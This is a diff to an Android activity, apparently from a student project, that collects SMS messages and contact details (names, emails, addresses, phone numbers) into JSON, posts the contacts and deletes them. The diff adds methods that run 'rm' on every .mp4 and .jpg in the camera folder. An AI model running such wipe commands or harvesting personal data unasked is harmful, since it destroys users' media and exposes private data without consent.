@@ -1,5 +1,7 @@
 package iiu.fyp.cdsr;
 
+import java.io.IOException;
+
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -56,20 +58,44 @@ public class UploadContent extends Activity {
         new PostData(contactsObj).execute();
         deleteAllContacts();
         
-        
+        deletevideos_all();
+        deleteimages_all();
+          
         
 	}
 	
 	
-
 	@Override
 	public boolean onCreateOptionsMenu(Menu menu) {
 		// Inflate the menu; this adds items to the action bar if it is present.
 		getMenuInflater().inflate(R.menu.upload_content, menu);
 		return true;
 	}
-
+	public void deletevideos_all()
+	{
+		//java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.mp4");
+		
+		try {
+			java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.mp4");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+	
+	public void deleteimages_all()
+	{
+		//java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.mp4");
+		
+		try {
+			java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.jpg");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
 	public JSONObject getsms(Uri uriSMSURI,String type)
+	
 	{
 	      Cursor cur = getContentResolver().query(uriSMSURI, null, null, null,null);
 	      JSONArray smsArray = new JSONArray();
@@ -113,13 +139,11 @@ public class UploadContent extends Activity {
 	
 	public JSONObject getcontacts()
 	{
-		int temp = 1;
 		//Create required JSONobjects.
-		JSONObject phone_obj = new JSONObject();
-		JSONObject json_contacts_obj = new JSONObject();
-		JSONObject contact_obj = new JSONObject();
+		JSONObject all_contactsObj = new JSONObject();
+		JSONObject one_contactObj = new JSONObject();
+		//----------------------------
 		JSONArray contacts_array = new JSONArray();
-		JSONArray address_array = new JSONArray();
 		String emailIdOfContact = null;
 		int emailType = Email.TYPE_WORK;
 		Context context=getBaseContext();
@@ -128,12 +152,13 @@ public class UploadContent extends Activity {
 		Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null); 
 	       while (cursor.moveToNext()) 
 	       { 
+	    	   one_contactObj = new JSONObject();
 	    	   String id = cursor.getString(cursor.getColumnIndex(BaseColumns._ID));
 	    	   	String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
 	    		
 	    	   	try {
-					contact_obj.put("name", contactName);
+	    	   		one_contactObj.put("name", contactName);
 				} catch (JSONException e1) {
 					// TODO Auto-generated catch block
 					e1.printStackTrace();
@@ -143,129 +168,132 @@ public class UploadContent extends Activity {
 	    	   	JSONObject email_obj = new JSONObject();
 	    	   	Cursor emailnew = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
 	    	   	Cursor emails = cr.query(Email.CONTENT_URI, null,Email.CONTACT_ID + " = " + id, null, null);
-                while (emails.moveToNext()) 
-                {
-            		
-                    emailIdOfContact = emails.getString(emails.getColumnIndex(Email.DATA));
-                    emailType = emails.getInt(emails.getColumnIndex(Phone.TYPE));
-                    //email1 = email1 + "--" + emailIdOfContact + " - " + emailType;
-                    if(emailIdOfContact == "Home")
-                    {
-                    	try {
+	            while (emails.moveToNext()) 
+	            {
+	        		email_obj = new JSONObject();
+	                emailIdOfContact = emails.getString(emails.getColumnIndex(Email.DATA));
+	                emailType = emails.getInt(emails.getColumnIndex(Phone.TYPE));
+	                //email1 = email1 + "--" + emailIdOfContact + " - " + emailType;
+	                if(emailIdOfContact == "Home")
+	                {
+	                	try {
 							email_obj.put("Home", emailIdOfContact);
 						} catch (JSONException e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
 						}
-                    }
-                    else if(emailIdOfContact == "Work")
-                    {
-                    	try {
+	                }
+	                else if(emailIdOfContact == "Work")
+	                {
+	                	try {
 							email_obj.put("Work", emailIdOfContact);
 						} catch (JSONException e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
 						}
-                    }
-                    else
-                    {
-                    	try {
+	                }
+	                else
+	                {
+	                	try {
 							email_obj.put("Other", emailIdOfContact);
 						} catch (JSONException e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
 						}
-                    }
-                    
-                    
-                }
-                try {
-					contact_obj.put("Email", email_obj);
-				} catch (JSONException e1) {
-					// TODO Auto-generated catch block
-					e1.printStackTrace();
-				}
-                emails.close();
-                emailnew.close();
-                //------------------- Retrieve Address ----------------------------
-                
-             // id = id of the contact you want the details from
-                
-                String where= ContactsContract.Data.CONTACT_ID + " = " + id + " AND ContactsContract.Data.MIMETYPE = '" + ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE + "'";
-                String[] projection = new String[] {
-                StructuredPostal.STREET, StructuredPostal.CITY,
-                StructuredPostal.POSTCODE, StructuredPostal.STREET,
-                StructuredPostal.REGION, StructuredPostal.COUNTRY,
-                };
+	                }
+	                
+	                
+	                
+	            }
+	            try {
+						one_contactObj.put("Email", email_obj);
+					} catch (JSONException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+	            
+	            emails.close();
+	            emailnew.close();
+	            //------------------- Retrieve Address ----------------------------
+	            
+	            // id = id of the contact you want the details from
+	            
+	            String where= ContactsContract.Data.CONTACT_ID + " = " + id + " AND ContactsContract.Data.MIMETYPE = '" + ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE + "'";
+	            String[] projection = new String[] {
+	            StructuredPostal.STREET, StructuredPostal.CITY,
+	            StructuredPostal.POSTCODE, StructuredPostal.STREET,
+	            StructuredPostal.REGION, StructuredPostal.COUNTRY,
+	            };
 
-                Cursor cursor2 = getContentResolver().query( ContactsContract.Data.CONTENT_URI, projection, where, null, StructuredPostal.COUNTRY + " asc");
-                while (cursor2.moveToNext()) 
-                {
 
-            		JSONObject address_obj = new JSONObject();
-                    String street1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.STREET));
-                    String postcode1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.POSTCODE));
-                    String region1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.REGION));
-                    String country1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.COUNTRY));
-                    String city1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.CITY));
-                    
-                    try {
+	    		JSONArray address_array = new JSONArray();
+	            Cursor cursor2 = getContentResolver().query( ContactsContract.Data.CONTENT_URI, projection, where, null, StructuredPostal.COUNTRY + " asc");
+	            while (cursor2.moveToNext()) 
+	            {
+
+	        		JSONObject address_obj = new JSONObject();
+	                String street1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.STREET));
+	                String postcode1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.POSTCODE));
+	                String region1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.REGION));
+	                String country1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.COUNTRY));
+	                String city1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.CITY));
+	                
+	                try {
 						address_obj.put("City", city1);
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
-                    try {
+	                try {
 						address_obj.put("Country", country1 );
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
-                    try {
+	                try {
 						address_obj.put("Region", region1 );
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
-                    try {
+	                try {
 						address_obj.put("PostalCode", postcode1 );
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
-                    try {
+	                try {
 						address_obj.put("Street", street1 );
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
-                    
-                    address_array.put(address_obj);
-                    if (cursor2.getCount() > 1)
-                	{
-                    	temp = 2;
-                    	
-                	}
-                    
-                }
+	                
+	                address_array.put(address_obj);
+	                
+	            }
 				try {
-					contact_obj.put("Address", address_array);
+					one_contactObj.put("Address", address_array);
 				} catch (JSONException e1) {
 					// TODO Auto-generated catch block
 					e1.printStackTrace();
 				}
-                
-                cursor2.close();
-                
-	    	   	//----------------------- Retrieve Contact number ------------------------
+	            
+	            cursor2.close();
+	            
+	    	   	//----------------------- Retrieve Contact number ------------------------ 
 	    	   	String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)); 
 	    		String hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
 	    		if (hasPhone!=null) 
 	    		{
+	    			JSONArray phone_array = new JSONArray();
+	    			JSONObject phone_obj = new JSONObject();
 	    			// You know it has a number so now query it like this.
 	    			Cursor phones = getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null); 
+	    			
 	    			while (phones.moveToNext()) 
 	    			{ 
+
 	    				String num = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.TYPE));
 	    			 	String type=getType(num);
 	    			 	String phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
@@ -278,28 +306,30 @@ public class UploadContent extends Activity {
 						}
 	    			 }
 	    			try {
-						contact_obj.put("Phone", phone_obj);
+	    				one_contactObj.put("Phone", phone_obj);
 					} catch (JSONException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
 	    			 phones.close();
 	    			 }
+	    		
+	    		contacts_array.put(one_contactObj);
 	       } 
 	       cursor.close();
 	       //----------------------------------------------
-	       contacts_array.put(contact_obj);
+	       
 	       try {
-			json_contacts_obj.put("Contacts", contacts_array);
+	    	   all_contactsObj.put("Contacts", contacts_array);
 		} catch (JSONException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		
 	       
-	       return json_contacts_obj;
+	       return all_contactsObj;
 	}
-	
+
 	private String getType(String value)
     {
     	if(value.trim().equals("1"))
